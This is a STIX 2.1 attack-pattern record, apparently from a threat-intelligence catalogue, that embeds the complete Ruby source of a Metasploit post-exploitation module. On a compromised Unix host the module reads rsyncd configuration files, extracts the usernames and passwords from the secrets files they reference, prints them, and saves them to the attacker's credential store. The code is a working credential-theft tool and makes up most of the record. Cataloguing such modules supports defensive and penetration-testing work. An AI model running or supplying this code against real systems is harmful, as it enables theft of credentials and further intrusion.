{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--89c82fdf-3e2e-4ff8-a78f-1c546aee5f87",
    "created": "2024-08-14T16:33:19.169069Z",
    "modified": "2024-08-14T16:33:19.169073Z",
    "name": "UNIX Gather RSYNC Credentials",
    "description": " Post Module to obtain credentials saved for RSYNC in various locations  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/rsyncd_creds.rb",
            "external_id": "rsyncd_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'UNIX Gather RSYNC Credentials',\n        'Description' => %q{\n          Post Module to obtain credentials saved for RSYNC in various locations\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Jon Hart <jon_hart[at]rapid7.com>' ],\n        'SessionTypes' => %w[shell]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USER_CONFIG', [\n          false, 'Attempt to get passwords from this RSYNC ' \\\n          'configuration file relative to each local user\\'s home directory.  Leave unset to disable.', 'rsyncd.conf'\n        ])\n      ]\n    )\n    register_advanced_options(\n      [\n        OptString.new('RSYNCD_CONFIG', [true, 'Path to rsyncd.conf', '/etc/rsyncd.conf'])\n      ]\n    )\n  end\n\n  def setup\n    @user_config = datastore['USER_CONFIG'].blank? ? nil : datastore['USER_CONFIG']\n  end\n\n  def dump_rsync_secrets(config_file)\n    vprint_status(\"Attempting to get RSYNC creds from #{config_file}\")\n    creds_table = Rex::Text::Table.new(\n      'Header' => \"RSYNC credentials from #{config_file}\",\n      'Columns' => %w[Username Password Module]\n    )\n\n    # read the rsync configuration file, extracting the 'secrets file'\n    # directive for any rsync modules (shares) within\n    rsync_config = Rex::Parser::Ini.new(config_file)\n    # https://github.com/rapid7/metasploit-framework/issues/6265\n    rsync_config.each_key do |rmodule|\n      # XXX: Ini assumes anything on either side of the = is the key and value,\n      # including spaces, so we need to fix this\n      module_config = Hash[rsync_config[rmodule].map { |k, v| [ k.strip, v.strip ] }]\n      next unless (secrets_file = module_config['secrets file'])\n\n      read_file(secrets_file).split(/\\n/).map do |line|\n        next if line =~ /^#/\n\n        if /^(?<user>[^:]+):(?<password>.*)$/ =~ line\n          creds_table << [ user, password, rmodule ]\n          report_rsync_cred(user, password, rmodule)\n        end\n      end\n    end\n\n    return if creds_table.rows.empty?\n\n    print_line(creds_table.to_s)\n  end\n\n  def report_rsync_cred(user, password, rmodule)\n    credential_data = {\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      username: user,\n      private_data: password,\n      private_type: :password,\n      realm_value: rmodule,\n      # XXX: add to MDM?\n      # realm_key: Metasploit::Model::Realm::Key::RSYNC_MODULE,\n      workspace_id: myworkspace_id\n    }\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      address: session.session_host,\n      # TODO: rsync is 99.9% of the time on 873/TCP, but can be configured differently with the\n      # 'port' directive in the global part of the rsyncd configuration file.\n      # Unfortunately, Rex::Parser::Ini does not support parsing this just yet\n      port: 873,\n      protocol: 'tcp',\n      service_name: 'rsync',\n      core: credential_core,\n      access_level: 'User',\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      workspace_id: myworkspace_id\n    }\n    create_credential_login(login_data)\n  end\n\n  def run\n    # build up a list of rsync configuration files to read, including the\n    # default location of the daemon config as well as any per-user\n    # configuration files that may exist (rare)\n    config_path = datastore['RSYNCD_CONFIG']\n    config_files = Set.new([ config_path ])\n    config_files |= enum_user_directories.map { |d| ::File.join(d, @user_config) } if @user_config\n    config_files.map { |config_file| dump_rsync_secrets(config_file) }\n  end\nend\n"
}